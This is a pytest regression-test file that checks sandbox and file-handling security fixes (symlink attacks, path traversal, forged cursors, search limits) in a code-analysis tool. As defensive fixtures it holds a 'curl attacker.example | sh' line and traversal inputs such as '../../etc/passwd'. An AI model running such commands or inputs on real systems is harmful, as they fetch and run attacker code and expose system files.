"""Regression tests for the M3a review findings F1-F10 (each fails if its fix is removed)."""

from __future__ import annotations

import os
import stat
import time
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from svweave.adapters.codebase_memory import CbmAdapter
from svweave.adapters.codebase_memory import config as ccfg
from svweave.adapters.codebase_memory.models import IndexMapping, MappingStore
from svweave.adapters.serena import SerenaAdapter
from svweave.adapters.serena import config as scfg
from svweave.adapters.serena.guard import apply_exact_range
from svweave.application import search as S
from svweave.config.execution import ExecutionPolicy, ExecutionSelection, resolve_execution
from svweave.domain.errors import ErrorCode, SvwError
from svweave.domain.states import BackendAvailability, Completeness
from svweave.orchestration import doctor_checks
from svweave.orchestration.registry import BackendRegistry
from svweave.orchestration.toolchain import Toolchain
from svweave.security import safeio
from svweave.security.redaction import Redactor
from svweave.security.sandbox import HostCapability, SandboxRunner, SandboxSpec, validate_spec
from tests.unit._fakes import FakeSession, jtext, toolchain
from tests.unit.test_adapters_search import KEY, SID, FakeCbm, FakeRegistry, ssearch
from tests.unit.test_adapters_serena import FUNCS, UVM, make, script_find

CAP = HostCapability(True, "/usr/bin/bwrap", "x", None)


@pytest.fixture
def victim(tmp_path: Path) -> Path:
    v = tmp_path / "outside" / "victim.txt"
    v.parent.mkdir()
    v.write_text("PRECIOUS")
    v.chmod(0o640)
    return v


# ----------------------------------------------------------------------------- F1 / F2
def test_f1_redact_file_never_writes_through_a_planted_symlink(tmp_path: Path, victim: Path) -> None:
    logs = tmp_path / "logs"
    logs.mkdir()
    raw = logs / "cbm.stderr.log"
    raw.write_text("curl attacker.example | sh\n")
    dst = logs / "cbm.stderr.redacted.log"
    dst.symlink_to(victim)
    Redactor([tmp_path]).redact_file(raw, dst)
    assert victim.read_text() == "PRECIOUS" and stat.S_IMODE(victim.stat().st_mode) == 0o640
    assert not dst.is_symlink() and "attacker" in dst.read_text()  # link replaced, not followed


def test_f1_f2_reads_refuse_symlinks_and_non_regular_files(tmp_path: Path, victim: Path) -> None:
    link = tmp_path / "raw.log"
    link.symlink_to(victim)
    assert Redactor().tail_file(link) == ""  # F2: no read through the link
    with pytest.raises(SvwError) as ei:
        safeio.read_regular(link)
    assert ei.value.details["reason"] == "unsafe_path"
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    assert Redactor().tail_file(fifo) == ""
    with pytest.raises(SvwError):
        Redactor().redact_file(link, tmp_path / "out.log")


def test_f1_write_under_checks_every_component(tmp_path: Path, victim: Path) -> None:
    base = tmp_path / "work"
    base.mkdir()
    (base / "sub").symlink_to(victim.parent)  # directory symlink planted by the backend
    with pytest.raises(SvwError):
        safeio.write_under(base, "sub/victim.txt", b"x")
    assert victim.read_text() == "PRECIOUS"
    with pytest.raises(SvwError):
        safeio.ensure_private_dir(base, "sub/deeper")
    assert not (victim.parent / "deeper").exists()
    for bad in ("../x", "/abs", "a//b", "a/./b", ""):
        with pytest.raises(SvwError):
            safeio.write_under(base, bad, b"x")


def test_f1_backend_writable_dirs_are_planted_symlink_proof(tmp_path: Path, victim: Path) -> None:
    paths = ccfg.CbmPaths(tmp_path / "state")
    paths.ensure()
    os.rmdir(paths.cache)
    paths.cache.symlink_to(victim.parent)  # backend replaced work/cache by a link to a host dir
    before = stat.S_IMODE(victim.parent.stat().st_mode)
    with pytest.raises(SvwError):
        paths.ensure()
    assert stat.S_IMODE(victim.parent.stat().st_mode) == before


def test_f1_state_split_host_only_dirs_are_not_in_the_sandbox_spec(tmp_path: Path) -> None:
    tc = toolchain()
    cb = CbmAdapter(tc, tmp_path / "cs", tmp_path / "snaps", SandboxRunner(capability=CAP), verify_binary=False)
    snap = tmp_path / "snaps" / "s1"
    snap.mkdir(parents=True)
    spec = cb._spec("/tmp/cbm-rt", snap)
    rw = [Path(p) for p in spec.rw_paths]
    assert rw == [cb.paths.work]
    everything = [*rw, *map(Path, spec.ro_paths)]
    for host_only in (cb.paths.logs, cb.paths.mapping_file, cb.paths.stderr_log, cb.paths.state_dir):
        assert host_only not in everything, f"{host_only} must not be mounted into the sandbox"
    assert cb.paths.stderr_log.is_relative_to(cb.paths.state_dir) and not cb.paths.stderr_log.is_relative_to(cb.paths.work)
    assert cb.paths.mapping_file.parent == cb.paths.state_dir


def test_f1_serena_state_split_and_config_rewrite_is_link_proof(tmp_path: Path, cand: Path, victim: Path) -> None:
    ad, _ = make(tmp_path, cand)
    spec = ad._spec({})
    assert set(map(Path, spec.rw_paths)) == {ad.candidate, ad.paths.work}
    assert ad.paths.logs not in spec.rw_paths and ad.paths.ctx_dir in spec.ro_paths
    ad.paths.prepare(ad.candidate)
    cfgf = ad.paths.serena_home / "serena_config.yml"
    cfgf.unlink()
    cfgf.symlink_to(victim)  # planted between runs
    ad.paths.prepare(ad.candidate)
    assert victim.read_text() == "PRECIOUS" and not cfgf.is_symlink()
    proj = ad.paths.projects_dir / ad.candidate.name / ".serena"
    for f in proj.iterdir():
        f.unlink()
    proj.rmdir()
    proj.parent.rmdir()
    (ad.paths.projects_dir / ad.candidate.name).symlink_to(victim.parent)
    with pytest.raises(SvwError):
        ad.paths.prepare(ad.candidate)
    assert not (victim.parent / ".serena").exists()


def test_f1_mapping_store_is_atomic_and_ignores_a_linked_file(tmp_path: Path, victim: Path) -> None:
    p = tmp_path / "m.json"
    p.symlink_to(victim)
    assert MappingStore(p).all() == {}  # never loads (or trusts) a link
    m = IndexMapping(SID, "/r", "proj", "f", 1, 1, None, "full", "0.11.0", "h")
    MappingStore(p).put(m)
    assert victim.read_text() == "PRECIOUS" and not p.is_symlink()
    assert MappingStore(p).get(SID) == m
    assert not [f for f in tmp_path.iterdir() if ".svw-" in f.name]


def test_f1_exact_range_does_not_follow_a_planted_temp_link(tmp_path: Path, cand: Path, victim: Path) -> None:
    import hashlib

    data = (cand / UVM).read_bytes()
    old = b"$display"
    a = data.index(old)
    (cand / "uvm" / ".pkg.sv.svw-tmp").symlink_to(victim)
    (cand / "uvm" / "pkg.sv.svw-tmp").symlink_to(victim)
    apply_exact_range(cand, UVM, a, a + len(old), hashlib.sha256(old).hexdigest(), b"$write")
    assert victim.read_text() == "PRECIOUS"
    assert b"$write" in (cand / UVM).read_bytes()


# ----------------------------------------------------------------------------- F3
def test_f3_verible_filelist_symlink_is_refused_not_followed(tmp_path: Path, cand: Path, victim: Path) -> None:
    (cand / "verible.filelist").symlink_to(victim)
    with pytest.raises(SvwError) as ei:
        scfg.check_candidate(cand)
    assert ei.value.details["reason"] == "candidate_generated_file_unsafe"
    # even a direct write must not follow it
    scfg.write_verible_filelist(cand)
    assert victim.read_text() == "PRECIOUS" and (cand / "verible.filelist").is_file()
    (cand / "verible.filelist").unlink()
    (cand / "verible.filelist").mkdir()
    with pytest.raises(SvwError):
        scfg.check_candidate(cand)


def test_f3_filelist_rejects_newline_in_names_and_uses_0644(tmp_path: Path, cand: Path) -> None:
    (cand / "evil\nname.sv").write_text("")
    with pytest.raises(SvwError) as ei:
        scfg.write_verible_filelist(cand)
    assert ei.value.details["reason"] == "filename_has_newline"
    (cand / "evil\nname.sv").unlink()
    scfg.write_verible_filelist(cand)
    assert stat.S_IMODE((cand / "verible.filelist").stat().st_mode) == 0o644


# ----------------------------------------------------------------------------- F5
def test_f5_cursor_key_is_required_and_cursors_are_signed(tmp_path: Path) -> None:
    root = tmp_path / "s"
    root.mkdir()
    (root / "a.sv").write_text("needle\nneedle\n")
    with pytest.raises(TypeError):
        S.svw_search(snapshot_id=SID, snapshot_root=root, query="needle")  # type: ignore[call-arg]
    for bad in (b"", b"short", None):
        with pytest.raises(SvwError) as ei:
            S.svw_search(snapshot_id=SID, snapshot_root=root, query="needle", cursor_key=bad)  # type: ignore[arg-type]
        assert ei.value.details["field"] == "cursor_key"
    assert not hasattr(S, "UNSIGNED_CURSOR_KEY")
    e = ssearch(snapshot_id=SID, snapshot_root=root, query="needle", limit=1)
    with pytest.raises(SvwError) as ei2:  # a cursor forged without the key
        ssearch(snapshot_id=SID, snapshot_root=root, query="needle", limit=1,
                cursor=S.encode_cursor(SID, S.query_hash("needle", None), S.TEXT_FALLBACK, 1, b"public-constant!!!"))
    assert "signature" in ei2.value.message
    assert ssearch(snapshot_id=SID, snapshot_root=root, query="needle", limit=1,
                   cursor=e.pagination.next_cursor).data["items"]


def test_f5_forged_huge_offset_is_rejected_cheaply(tmp_path: Path) -> None:
    root = tmp_path / "s"
    root.mkdir()
    (root / "big.sv").write_bytes(b"a" * (200 * 1024))
    t = time.monotonic()
    with pytest.raises(SvwError) as ei:
        S.text_search(root, "a", None, 10**9, 10)
    assert ei.value.details["reason"] == "offset_too_large" and time.monotonic() - t < 1
    forged = S.encode_cursor(SID, S.query_hash("a", None), S.TEXT_FALLBACK, 10**9, KEY)  # even correctly signed
    with pytest.raises(SvwError):
        ssearch(snapshot_id=SID, snapshot_root=root, query="a", cursor=forged)


def test_f5_two_mib_single_line_file_stays_within_budget(tmp_path: Path) -> None:
    root = tmp_path / "s"
    root.mkdir()
    (root / "one_line.sv").write_bytes(b"a" * (2 * 1024 * 1024))  # no newline, a match at EVERY byte
    budget = 1.5
    t = time.monotonic()
    env = ssearch(snapshot_id=SID, snapshot_root=root, query="a", limit=100, cursor=None,
                  text_limits=S.TextSearchLimits(time_budget_s=budget))
    # worst allowed cursor offset on the dense file
    scan = S.text_search(root, "a", None, S.MAX_OFFSET, 100, S.TextSearchLimits(time_budget_s=budget))
    assert time.monotonic() - t < 2 * budget + 1.0
    assert len(env.data["items"]) == 100 and all(i["line"] == 1 for i in env.data["items"])
    assert all(len(i["snippet"]) <= S.SNIPPET_CHARS + 1 for i in env.data["items"])
    assert len(scan.hits) == 100 and scan.hits[0].byte_start == S.MAX_OFFSET


def test_f5_deadline_is_checked_inside_the_match_loop(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    root = tmp_path / "s"
    root.mkdir()
    (root / "one.sv").write_bytes(b"a" * 100_000)
    ticks = {"n": 0}

    def clock() -> float:
        ticks["n"] += 1
        return 0.0 if ticks["n"] <= 6 else 1e9  # file loop and listing pass; the match loop trips

    monkeypatch.setattr(S.time, "monotonic", clock)
    scan = S.text_search(root, "a", None, 0, 100_000, S.TextSearchLimits(time_budget_s=10))
    assert scan.truncated_by_budget and 0 < len(scan.hits) < 100_000
    assert any("while scanning" in s for s in scan.files_skipped)
    env = ssearch(snapshot_id=SID, snapshot_root=root, query="a", limit=500,
                  text_limits=S.TextSearchLimits(time_budget_s=10))
    assert env.analysis_coverage is not None and env.analysis_coverage.completeness is Completeness.PARTIAL
    assert env.pagination.truncated


def test_f5_line_numbers_stay_correct_with_incremental_counting(tmp_path: Path) -> None:
    root = tmp_path / "s"
    root.mkdir()
    lines = ["x", "needle a needle", "", "needle", "y needle\r", "z"]
    (root / "t.sv").write_text("\n".join(lines))
    scan = S.text_search(root, "needle", None, 0, 50)
    assert [(h.line, h.byte_start) for h in scan.hits] == [
        (2, 2), (2, 11), (4, 19), (5, 28)]
    assert all((root / "t.sv").read_bytes()[h.byte_start:h.byte_end] == b"needle" for h in scan.hits)


def test_f5_file_listing_is_bounded(tmp_path: Path) -> None:
    root = tmp_path / "s"
    root.mkdir()
    for i in range(50):
        (root / f"f{i:02}.sv").write_text("x")
    files, notes = S._iter_files(root, None, 10, time.monotonic() + 5)
    assert len(files) == 10 and notes
    files2, notes2 = S._iter_files(root, None, 10_000, time.monotonic() - 1)
    assert notes2 and len(files2) < 50


# ----------------------------------------------------------------------------- F6 / F9
def test_f6_graph_cursor_advances_by_rows_consumed_not_items_kept(tmp_path: Path) -> None:
    snap = tmp_path / "snap"
    snap.mkdir()
    cbm = FakeCbm()
    keep = cbm.cands[0]
    keep.file = "rtl/a.sv"
    cbm.positions, cbm.consumed = [3], 5  # 5 upstream rows, only the 4th survives the scope filter
    env = ssearch(snapshot_id=SID, snapshot_root=snap, query="q", registry=FakeRegistry(cbm), limit=5, scope="rtl/*")  # type: ignore[arg-type]
    assert len(env.data["items"]) == 1
    _, off = S.decode_cursor(env.pagination.next_cursor, SID, S.query_hash("q", "rtl/*"), KEY)
    assert off == 5, "must skip all 5 consumed rows, not 1 kept item"


def test_f6_cursor_never_repeats_the_same_offset(tmp_path: Path) -> None:
    snap = tmp_path / "snap"
    snap.mkdir()
    cbm = FakeCbm()
    cbm.cands, cbm.positions, cbm.consumed = [], [], 0  # upstream says has_more but returned nothing
    env = ssearch(snapshot_id=SID, snapshot_root=snap, query="q", registry=FakeRegistry(cbm), limit=5)  # type: ignore[arg-type]
    assert env.pagination.next_cursor is None and any("no rows to advance" in w for w in env.warnings)
    cbm2 = FakeCbm()
    first = ssearch(snapshot_id=SID, snapshot_root=snap, query="q", registry=FakeRegistry(cbm2), limit=1)  # type: ignore[arg-type]
    ssearch(snapshot_id=SID, snapshot_root=snap, query="q", registry=FakeRegistry(cbm2), limit=1,  # type: ignore[arg-type]
            cursor=first.pagination.next_cursor)
    assert [a["offset"] for a in cbm2.search_args] == [0, 1]


def test_f6_size_capped_page_resumes_at_the_first_unreturned_row(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    snap = tmp_path / "snap"
    snap.mkdir()
    cbm = FakeCbm()
    base = cbm.cands[0]
    cbm.cands = [type(base)(**{**base.__dict__, "name": f"n{i}"}) for i in range(4)]
    cbm.positions, cbm.consumed = [0, 2, 3, 5], 6  # rows 1 and 4 were dropped upstream-side
    monkeypatch.setattr(S, "_cap_items", lambda items: (items[:2], True))
    env = ssearch(snapshot_id=SID, snapshot_root=snap, query="q", registry=FakeRegistry(cbm), limit=10)  # type: ignore[arg-type]
    _, off = S.decode_cursor(env.pagination.next_cursor, SID, S.query_hash("q", None), KEY)
    assert off == 3  # rows 0..2 consumed (row index of the 2nd kept item + 1)


def test_f9_degraded_isolation_marks_graph_results_degraded(tmp_path: Path) -> None:
    from svweave.security.sandbox import IsolationMode

    snap = tmp_path / "snap"
    snap.mkdir()
    cbm = FakeCbm()
    cbm.isolation = IsolationMode.DEGRADED_NO_ISOLATION
    env = ssearch(snapshot_id=SID, snapshot_root=snap, query="q", registry=FakeRegistry(cbm))  # type: ignore[arg-type]
    assert env.data["backend_used"] == "codebase-memory-mcp" and env.data["degraded"] is True
    assert "WITHOUT process isolation" in env.data["degraded_reason"]
    assert env.warnings[0].startswith("DEGRADED ISOLATION")
    ok = ssearch(snapshot_id=SID, snapshot_root=snap, query="q", registry=FakeRegistry(FakeCbm()))  # type: ignore[arg-type]
    assert ok.data["degraded"] is False


def test_f9_only_the_requested_snapshot_is_mounted(tmp_path: Path) -> None:
    cb = CbmAdapter(toolchain(), tmp_path / "cs", tmp_path / "snaps", SandboxRunner(capability=CAP), verify_binary=False)
    a, b = tmp_path / "snaps" / "A", tmp_path / "snaps" / "B"
    a.mkdir(parents=True)
    b.mkdir()
    ro = [Path(p) for p in cb._spec("/tmp/x", a).ro_paths]
    assert a in ro and b not in ro and tmp_path / "snaps" not in ro
    assert tmp_path / "snaps" not in [Path(p) for p in cb._spec("/tmp/x", None).ro_paths]


def test_f9_switching_snapshots_restarts_with_the_new_mount(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    cb = CbmAdapter(toolchain(), tmp_path / "cs", tmp_path / "snaps", SandboxRunner(capability=CAP), verify_binary=False)
    a, b = tmp_path / "snaps" / "A", tmp_path / "snaps" / "B"
    a.mkdir(parents=True)
    b.mkdir()
    cb._session = FakeSession({})
    cb._bound_root = a.resolve()
    started: list[Path | None] = []
    monkeypatch.setattr(CbmAdapter, "start", lambda self, bind_root=None: started.append(bind_root) or None)  # type: ignore[arg-type,return-value]
    cb._ensure_bound(a)
    assert started == []
    old = cb._session
    cb._session = FakeSession({})
    cb._ensure_bound(b)
    assert started == [b.resolve()] and old is not None


# ----------------------------------------------------------------------------- F7
def test_f7_protected_paths_reach_the_sandbox_spec_for_both_adapters(tmp_path: Path, cand: Path) -> None:
    orig = tmp_path / "original_src"
    orig.mkdir()
    cb = CbmAdapter(toolchain(), tmp_path / "cs", tmp_path / "snaps", SandboxRunner(capability=CAP),
                    protected_paths=(orig,), verify_binary=False)
    assert tuple(cb._spec("/tmp/x").protected_paths) == (orig,)
    se = SerenaAdapter(toolchain(), tmp_path / "ss", cand, SandboxRunner(capability=CAP), protected_paths=(orig,))
    assert tuple(se._spec({}).protected_paths) == (orig,)
    # and the guard really bites: a candidate inside the protected root would be writable original
    inside = orig / "cand"
    inside.mkdir()
    se2 = SerenaAdapter(toolchain(), tmp_path / "ss2", inside, SandboxRunner(capability=CAP), protected_paths=(orig,))
    with pytest.raises(SvwError) as ei:
        validate_spec(se2._spec({}))
    assert ei.value.code is ErrorCode.POLICY_DENIED
    # but the backend's own work dir below a protected project root is allowed (exact exemption only)
    proj = tmp_path / "proj"
    (proj / ".svweave" / "backends").mkdir(parents=True)
    cb2 = CbmAdapter(toolchain(), proj / ".svweave" / "backends" / "cbm", proj / ".svweave" / "snapshots",
                     SandboxRunner(capability=CAP), protected_paths=(proj,), verify_binary=False)
    validate_spec(cb2._spec("/tmp/x"))
    with pytest.raises(SvwError):  # ...whereas the exemption never covers a path CONTAINING the source
        validate_spec(SandboxSpec(rw_paths=(proj.parent,), protected_paths=(proj,), rw_exempt=(proj.parent,)))


def test_f7_registry_for_workspace_and_doctor_wire_protected_roots(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    ws = SimpleNamespace(
        roots=[SimpleNamespace(abs=tmp_path / "rtl"), SimpleNamespace(abs=None), SimpleNamespace(abs=tmp_path / "ip")],
        state_dir=tmp_path / ".svweave",
        execution=resolve_execution(ExecutionSelection(), ExecutionPolicy()),
    )
    reg = BackendRegistry.for_workspace(ws, toolchain(), sandbox=SandboxRunner(capability=CAP))
    assert reg.protected_paths == (tmp_path / "rtl", tmp_path / "ip")
    assert reg.backends_root == tmp_path / ".svweave" / "backends"
    seen: list[BackendRegistry] = []
    monkeypatch.setattr(doctor_checks, "health_checks", lambda r, probe: seen.append(r) or [])
    monkeypatch.setenv("SVWEAVE_TOOLCHAIN_ROOT", str(toolchain().root))
    doctor_checks.backend_checks(SimpleNamespace(workspace=ws, options=SimpleNamespace(root=tmp_path)))
    assert seen and seen[0].protected_paths == (tmp_path / "rtl", tmp_path / "ip")
    seen.clear()
    doctor_checks.backend_checks(SimpleNamespace(options=SimpleNamespace(root=tmp_path), workspace=None))
    assert seen[0].protected_paths == (tmp_path,)  # no manifest: protect the whole project root


# ----------------------------------------------------------------------------- F8
def test_f8_pyslang_ready_requires_a_real_compile(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from svweave.orchestration import registry as R

    reg = BackendRegistry(toolchain(), tmp_path / "b", tmp_path / "s", sandbox=SandboxRunner(capability=CAP))
    h = reg.probe_pyslang()
    assert h.status is BackendAvailability.READY and h.probed
    assert h.details["compile"]["errors"] == 0 and h.details["compile"]["tops"] == [R.PYSLANG_PROBE_TOP]
    monkeypatch.setattr(R, "PYSLANG_PROBE_SV", "module svw_probe_top(input logic a, output logic b); assign b = ; endmodule\n")
    bad = reg.probe_pyslang()
    assert bad.status is BackendAvailability.UNAVAILABLE and not bad.probed
    assert "fixture compile failed" in bad.reasons[-1]
    assert not reg.usable("pyslang")  # failed probe starts the cooldown too
    monkeypatch.setattr(R, "PYSLANG_PROBE_SV", "module some_other_top; endmodule\n")
    assert reg.probe_pyslang().status is BackendAvailability.UNAVAILABLE  # top instance not found


# ----------------------------------------------------------------------------- F10
def test_f10_planted_dot_serena_after_start_is_not_swallowed(tmp_path: Path, cand: Path) -> None:
    ad, fake = make(tmp_path, cand)
    script_find(fake, FUNCS)
    assert ad.find_symbol(cand, "c1")
    (cand / ".serena").mkdir()
    with pytest.raises(SvwError) as ei:
        ad.find_symbol(cand, "c1")
    assert ei.value.code is ErrorCode.POLICY_DENIED and ei.value.details["reason"] == "candidate_has_serena_dir"


def test_f10_serena_returned_paths_are_validated(tmp_path: Path, cand: Path) -> None:
    ad, fake = make(tmp_path, cand)
    loc = {"start_line": 0, "end_line": 1}
    fake.handlers["find_symbol"] = lambda a: jtext([
        {"name_path": "ok", "kind": "Function", "relative_path": UVM, "body_location": loc},
        {"name_path": "abs", "kind": "Function", "relative_path": "/etc/passwd", "body_location": loc},
        {"name_path": "up", "kind": "Function", "relative_path": "../../etc/passwd", "body_location": loc},
        {"name_path": "dot", "kind": "Function", "relative_path": "a/./b.sv", "body_location": loc}])
    assert [s.name_path for s in ad.find_symbol(cand, "x")] == ["ok"]
    fake.handlers["find_referencing_symbols"] = lambda a: jtext({
        "/etc/passwd": {"F": [{"name_path": "x", "body_location": loc}]},
        "../up.sv": {"F": [{"name_path": "y", "body_location": loc}]},
        "other.sv": {"F": [{"name_path": "z", "body_location": loc}]}})
    assert [r.relative_path for r in ad.find_referencing_symbols(cand, "x", UVM)] == ["other.sv"]


def test_f10_candidate_paths_with_glob_metacharacters_are_rejected(tmp_path: Path) -> None:
    for name in ("a*b", "a?b", "a[b]"):
        d = tmp_path / name
        d.mkdir()
        with pytest.raises(SvwError) as ei:
            scfg.check_candidate(d)
        assert ei.value.details["reason"] == "candidate_path_glob_chars"


def test_f10_python_bind_is_narrowed_to_exe_stdlib_and_libpython(tmp_path: Path) -> None:
    venv = Path(toolchain().serena_venv)
    real = Path(os.path.realpath(venv / "bin" / "python"))
    binds = scfg.python_binds(venv)
    if not binds:
        pytest.skip("interpreter lives under /usr: nothing extra to bind")
    prefix = real.parents[1]
    assert prefix not in binds, "the whole prefix (e.g. /usr/local) must not be bound"
    assert real in binds and any(b.name.startswith("python3") and b.is_dir() for b in binds)
    ad_spec = SerenaAdapter(toolchain(), tmp_path / "ss", _mk(tmp_path), SandboxRunner(capability=CAP))._spec({})
    assert prefix not in [Path(p) for p in ad_spec.ro_paths]


def _mk(tmp_path: Path) -> Path:
    d = tmp_path / "c"
    d.mkdir(exist_ok=True)
    return d


def test_f10_launch_uses_realpath_of_the_executables(tmp_path: Path) -> None:
    seen: list[list[str]] = []

    class Spy(SandboxRunner):
        def run_once(self, spec: Any, inner_argv: Any, **kw: Any) -> Any:
            seen.append(list(inner_argv))
            raise SvwError(ErrorCode.BACKEND_UNAVAILABLE, "stop here", {})

    tc = toolchain()
    link_root = tmp_path / "tc"
    (link_root / ".toolchain").mkdir(parents=True)
    (link_root / ".toolchain" / "cbm").symlink_to(tc.cbm_binary.parent)
    tc2 = type(tc)(root=link_root, lock=tc.lock, report=tc.report)
    cb = CbmAdapter(tc2, tmp_path / "cs", tmp_path / "snaps", Spy(capability=CAP), verify_binary=False)
    with pytest.raises(SvwError):
        cb.start()
    assert seen and seen[0][0] == os.path.realpath(tc.cbm_binary) and "tc" not in seen[0][0].split("/")[-3:-2]


def test_f10_failed_probe_sets_the_retry_cooldown(tmp_path: Path) -> None:
    reg = BackendRegistry(toolchain(), tmp_path / "b", tmp_path / "s", sandbox=SandboxRunner(capability=CAP),
                          fixtures_dir=tmp_path / "none")
    assert reg.probe_cbm().status is BackendAvailability.UNAVAILABLE
    assert not reg.usable("codebase-memory-mcp")
    assert reg.probe_serena().status is BackendAvailability.UNAVAILABLE
    assert not reg.usable("serena")


def test_f10_require_backends_env_turns_skips_into_failures(monkeypatch: pytest.MonkeyPatch) -> None:
    from tests.integration.conftest import skip_or_fail

    monkeypatch.delenv("SVWEAVE_REQUIRE_BACKENDS", raising=False)
    with pytest.raises(pytest.skip.Exception):
        skip_or_fail("cbm missing")
    monkeypatch.setenv("SVWEAVE_REQUIRE_BACKENDS", "1")
    with pytest.raises(pytest.fail.Exception):
        skip_or_fail("cbm missing")


def test_f10_idle_protocol_violation_is_labelled_protocol_error(tmp_path: Path, cand: Path) -> None:
    ad, fake = make(tmp_path, cand)
    fake.up = False
    fake.violation = {"kind": "non_protocol_stdout", "sample": "oops"}  # type: ignore[attr-defined]
    with pytest.raises(SvwError) as ei:
        ad.find_symbol(cand, "c1")
    assert ei.value.details["reason"] == "protocol_error" and ei.value.details["protocol_error"]["sample"] == "oops"
    from tests.unit.test_adapters_cbm import make as make_cbm

    cb, cfake, _ = make_cbm(tmp_path / "c2")
    cfake.up = False
    cfake.violation = {"kind": "non_protocol_stdout"}  # type: ignore[attr-defined]
    with pytest.raises(SvwError) as ei2:
        cb._require_running()
    assert ei2.value.details["reason"] == "protocol_error"


def test_f10_raw_session_is_not_publicly_reachable() -> None:
    for cls in (CbmAdapter, SerenaAdapter):
        assert not hasattr(cls, "session"), "public .session would bypass the tool allowlist"
        assert hasattr(cls, "pid") and hasattr(cls, "tool_infos") and hasattr(cls, "init_info")


def test_f10_python_links_recreate_the_chain_to_the_interpreter(tmp_path: Path) -> None:
    """A python-build-standalone runtime: venv/bin/python -> rt/bin/python3 -> python3.12."""
    rt = tmp_path / "rt/python"
    (rt / "bin").mkdir(parents=True)
    (rt / "lib/python3.12").mkdir(parents=True)
    (rt / "bin/python3.12").write_bytes(b"")
    (rt / "bin/python3").symlink_to("python3.12")
    (tmp_path / "venv/bin").mkdir(parents=True)
    (tmp_path / "venv/bin/python").symlink_to(rt / "bin/python3")
    assert scfg.python_links(tmp_path / "venv") == [("python3.12", rt / "bin/python3")]
    assert rt / "bin/python3.12" in scfg.python_binds(tmp_path / "venv")
    (tmp_path / "v2/bin").mkdir(parents=True)
    (tmp_path / "v2/bin/python").symlink_to(rt / "bin/python3.12")  # direct: nothing to recreate
    assert scfg.python_links(tmp_path / "v2") == []
    spec = SerenaAdapter(toolchain(), tmp_path / "ss", _mk(tmp_path), SandboxRunner(capability=CAP))._spec({})
    assert list(spec.symlinks) == scfg.python_links(toolchain().serena_venv)
    validate_spec(spec)  # the links never fall inside a bound path


def test_f10_python_m_venv_links_already_mounted_are_not_recreated(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """``python -m venv``: venv/bin/python -> python3 -> /usr/bin/python3. The in-venv link is inside
    the venv bind and the system one under /usr: both are visible in the sandbox, recreating them would
    land on the host and the spec was refused (POLICY_DENIED: Serena could not start)."""
    venv = tmp_path / "venv"
    (venv / "bin").mkdir(parents=True)
    (venv / "bin/python3").symlink_to("/usr/bin/python3")
    (venv / "bin/python").symlink_to("python3")
    assert scfg.python_links(venv)[0] == ("/usr/bin/python3", venv / "bin/python3")
    monkeypatch.setattr(Toolchain, "serena_venv", property(lambda self: venv))
    spec = SerenaAdapter(toolchain(), tmp_path / "ss", _mk(tmp_path), SandboxRunner(capability=CAP))._spec({})
    assert spec.symlinks == ()
    validate_spec(spec)


def test_f10_an_alternatives_chain_is_left_to_the_etc_view(tmp_path: Path) -> None:
    """RHEL: /usr/bin/python3 -> /etc/alternatives/python3 -> /usr/bin/python3.6. The minimal /etc
    binds /etc/alternatives, so that hop is visible too; a runtime link outside every mount is kept."""
    chain = os.readlink("/usr/bin/python3") if os.path.islink("/usr/bin/python3") else ""
    if not chain.startswith("/etc/alternatives/") or not os.path.isdir("/etc/alternatives"):
        pytest.skip("/usr/bin/python3 is not managed by /etc/alternatives on this host")
    rt = tmp_path / "rt/bin"
    rt.mkdir(parents=True)
    (rt / "python3").symlink_to("/usr/bin/python3")
    venv = tmp_path / "venv"
    (venv / "bin").mkdir(parents=True)
    (venv / "bin/python").symlink_to(rt / "python3")
    raw = scfg.python_links(venv)
    assert (chain, Path("/usr/bin/python3")) in raw and any(str(p).startswith("/etc/alternatives/") for _t, p in raw)
    spec = SandboxSpec(ro_paths=(venv,))
    assert scfg.python_links(venv, spec) == [("/usr/bin/python3", rt / "python3")]
    validate_spec(SandboxSpec(ro_paths=(venv,), symlinks=tuple(scfg.python_links(venv, spec))))
